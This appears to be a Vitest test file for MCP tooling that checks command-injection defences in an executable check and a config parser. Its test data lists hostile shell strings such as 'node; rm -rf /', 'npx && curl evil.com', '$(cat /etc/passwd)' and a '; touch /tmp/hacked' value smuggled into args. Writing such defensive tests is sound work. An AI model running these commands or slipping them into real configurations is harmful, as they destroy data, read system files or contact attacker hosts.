import { describe, it, expect } from 'vitest';
import { StdioDiagnostics } from '../../src/adapters/mcp/stdioDiagnostics.js';
import { ConfigParser } from '../../src/discovery/configParser.js';

describe('Security: Command Injection Defense', () => {
  const stdio = new StdioDiagnostics();

  it('rejects command injection metacharacters during static executable check', () => {
    const maliciousCommands = [
      'node; rm -rf /',
      'npx && curl evil.com',
      '`whoami`',
      '$(cat /etc/passwd)',
      'ls | grep secret',
      'echo hello > /tmp/pwned',
    ];

    for (const cmd of maliciousCommands) {
      const result = stdio.verifyExecutable(cmd);
      expect(result.found).toBe(false);
      expect(result.error).toBeDefined();
    }
  });

  it('validates args as an array of discrete strings without shell interpolation', () => {
    const config = {
      mcpServers: {
        'injection-test': {
          command: 'node',
          args: ['--eval', 'console.log("safe")', '; touch /tmp/hacked'],
        },
      },
    };

    const parsed = ConfigParser.parseFileContent(
      JSON.stringify(config),
      '/test/mcp.json',
      'WORKSPACE'
    );

    expect(parsed.servers.length).toBe(1);
    const s = parsed.servers[0];
    expect(s.isValid).toBe(true);
    // Verified that args remains an array and is never converted to a concatenated shell string
    expect(Array.isArray(s.rawConfig.args)).toBe(true);
    expect(s.rawConfig.args).toHaveLength(3);
  });
});

